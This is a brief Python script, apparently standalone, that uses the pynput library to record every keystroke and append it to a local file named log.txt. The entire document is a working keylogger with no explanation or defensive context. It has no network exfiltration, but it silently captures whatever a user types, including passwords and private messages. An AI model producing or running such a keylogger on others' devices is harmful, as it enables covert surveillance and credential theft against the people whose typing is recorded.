#!/bin/python3
from pynput.keyboard import Listener

def on_press(key):
    with open('log.txt', 'a') as f:
        f.write(str(key)+'\n')

with Listener(on_press=on_press) as listener:
    listener.join()